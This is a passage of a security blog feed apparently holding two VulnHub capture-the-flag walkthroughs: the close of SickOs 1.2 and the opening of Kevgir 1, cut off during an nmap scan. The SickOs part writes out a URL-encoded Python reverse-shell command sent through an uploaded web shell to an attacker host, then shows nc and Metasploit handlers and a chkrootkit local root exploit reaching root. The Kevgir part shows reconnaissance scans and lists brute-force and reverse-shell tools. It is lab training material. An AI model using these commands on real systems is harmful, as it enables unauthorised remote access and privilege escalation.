</span><span class='line'>* upload completely sent off: <span class="m">30</span> out of <span class="m">30</span> bytes
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Content-Length: 0
</span><span class='line'>&lt; Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 05:04:11 GMT
</span><span class='line'>&lt; Server: lighttpd/1.4.28
</span><span class='line'>&lt;
</span><span class='line'>* Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.2/1.png"></p>

<p>Now set up <code>nc</code> to listen on port <code>443</code> (tried port &lsquo;4444&rsquo; but failed due to be blocked) and Then I tried to upload reverse shell via <code>wget</code> but failed for some reason and finally got the following <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="pentestmonkey Reverse Shell Cheat Sheet">method</a> works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="s2">&quot;http://10.1.1.133/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.1.1.132%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Got a limited shell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span><span class='line'>10.1.1.133: inverse host lookup failed: Unknown host
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.133<span class="o">]</span> 33544
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>www-data
</span></code></pre></td></tr></table></div></figure>


<p>In order to get a better and stable shell, I set up metasploit and re-run the python shell again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 10.1.1.132
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.1.1.132
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/shell_reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/shell_reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt;
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.1.1.132:443
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.132:443 -&gt; 10.1.1.133:33545<span class="o">)</span> at 2016-06-05 15:41:50 +1000
</span><span class='line'>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>^Z
</span><span class='line'>Background session 1? <span class="o">[</span>y/N<span class="o">]</span>  y
</span></code></pre></td></tr></table></div></figure>


<p>After spending couple of hours to <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="g0tmi1k Basic linux privilege escalation guide">enumerate</a> the target system and finally found an vulnerable program (<a href="https://www.exploit-db.com/exploits/33899/" title="chkrootkit 0.49 - Local Root Vulnerability">chkrookit version 0.49</a>) running on the system.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dpkg -l <span class="p">|</span> grep chkroot
</span><span class='line'>rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
</span></code></pre></td></tr></table></div></figure>


<p>Exploit <code>chkrootkit</code> to get ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/unix/local/chkrootkit
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/unix/local/chkrootkit<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name        Current Setting       Required  Description
</span><span class='line'>   ----        ---------------       --------  -----------
</span><span class='line'>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
</span><span class='line'>   SESSION     <span class="m">1</span>                     yes       The session to run this module on.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   <span class="m">0</span>   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="nb">set </span>lport 8080
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 8080
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; run -j
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP double handler on 10.1.1.132:8080
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Rooting depends on the crontab <span class="o">(</span>this could take a <span class="k">while</span><span class="o">)</span>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="o">[</span>*<span class="o">]</span> Payload written to /tmp/update
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Waiting <span class="k">for</span> chkrootkit to run via cron...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Accepted the first client connection...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Accepted the second client connection...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command: <span class="nb">echo </span>cywywDOR3lw9KtfF<span class="p">;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Writing to socket A
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Writing to socket B
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Reading from sockets...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Reading from socket A
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> A: <span class="s2">&quot;cywywDOR3lw9KtfF\r\n&quot;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Matching...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> B is input...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">2</span> opened <span class="o">(</span>10.1.1.132:8080 -&gt; 10.1.1.133:47139<span class="o">)</span> at 2016-06-05 15:47:03 +1000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/update
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -l
</span><span class='line'>
</span><span class='line'>Active <span class="nv">sessions</span>
</span><span class='line'><span class="o">===============</span>
</span><span class='line'>
</span><span class='line'>  Id  Type         Information                                             Connection
</span><span class='line'>  --  ----         -----------                                             ----------
</span><span class='line'>  <span class="m">1</span>   shell linux  /bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off <span class="nv">$ </span> 10.1.1.132:443 -&gt; 10.1.1.133:33545 <span class="o">(</span>10.1.1.133<span class="o">)</span>
</span><span class='line'>  <span class="m">2</span>   shell unix                                                           10.1.1.132:8080 -&gt; 10.1.1.133:47139 <span class="o">(</span>10.1.1.133<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -i 2
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting interaction with 2...
</span><span class='line'>
</span><span class='line'>587635846
</span><span class='line'>xjfpouiBcdHXtWSGDLawUifFliLoRHgO
</span><span class='line'><span class="nb">true</span>
</span><span class='line'>glQiWVKYGXJIbMNxCzFdLkHTvwzJXMsL
</span><span class='line'>XhEJPxQGJEXCqeHWEuuyRuhgtzDjhhsG
</span><span class='line'>lblxnAmeZfPiTZxaWNHygwoaqIzqbUNo
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then grab the FLAG file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>WoW! If you are viewing this, You have <span class="s2">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class="o">(</span>s<span class="o">)</span>, gathering more information about the target using different methods, though <span class="k">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
</span><span class='line'>
</span><span class='line'>Thanks <span class="k">for</span> giving this try.
</span><span class='line'>
</span><span class='line'>@vulnhub: Thanks <span class="k">for</span> hosting this UP!.
</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Kevgir: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/05/29/vulnhub-kevgir-1/"/>
    <updated>2016-05-29T14:26:08+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/05/29/vulnhub-kevgir-1</id>
    <content type="html"><![CDATA[<p>&ldquo;For Educational Purposes</p>

<p>Kevgir has designed by canyoupwnme team for training, hacking practices and exploiting. Kevgir has lots of vulnerable services and web applications for testing. We are happy to announced that.</p>

<p>Have fun!&ldquo; &ndash; <a href="https://canyoupwn.me/">canyoupwn.me</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/kevgir-1,137/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Kevgir: 1 (<em>10.1.1.128/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<p>A bunch of vunlerabilities exists in this machine and waiting us to dig them out, attacking vectors including:</p>

<ul>
<li>Bruteforce Attacks</li>
<li>Web Application Vulnerabilities</li>
<li>Hacking with Redis</li>
<li>Hacking with Tomcat, Jenkins</li>
<li>Hacking with Misconfigurations</li>
<li>Hacking with CMS Exploits</li>
<li>Local Privilege Escalation</li>
<li>And other vulnerabilities</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Online bruteforce attack to reveal weak passwords [<font color="FF8000">hydra</font>]</li>
<li>Exploit multiple vulnerabilities to get a shell</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists Dictionary</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.rapid7.com/products/metasploit/index.jsp">metasploit framework</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/usr/share/exploitdb# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.128    00:0c:29:c1:44:ae   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:e2:6b:e8   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.984 seconds <span class="o">(</span>85.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span><span class='line'>root@kali:/usr/share/exploitdb#
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.128</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.128/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-05-23 10:10:36 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8081/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 25/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 8080/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 6379/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 44966/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 9000/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 37543/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 59876/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 139/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 35812/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 1322/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 41295/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 2049/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 34551/tcp on 10.1.1.128
</span><span class='line'>Discovered open port 59788/tcp on 10.1.1.128
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Mon May 23 06:20:21 2016 as: nmap -sV -A -O -v -p 25-9000,34551-44966,59788,59876 -oN 128_nmap.txt 10.1.1.128</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.128
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">19376</span> closed ports
</span><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
</span><span class='line'><span class="p">|</span>_smtp-commands: SMTP: EHLO <span class="m">530</span> Please login with USER and PASS.
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>_http-methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Kevgir VM
</span><span class='line'>111/tcp   open  rpcbind     2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>_  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X <span class="o">(</span>workgroup: CANYOUPWNME<span class="o">)</span>
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X <span class="o">(</span>workgroup: CANYOUPWNME<span class="o">)</span>
</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>2049/tcp  open  nfs         2-4 <span class="o">(</span>RPC <span class="c">#100003)</span>
</span><span class='line'>6379/tcp  open  redis       Redis key-value store
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'><span class="p">|</span> http-methods: GET HEAD POST PUT DELETE OPTIONS
</span><span class='line'><span class="p">|</span> Potentially risky methods: PUT DELETE
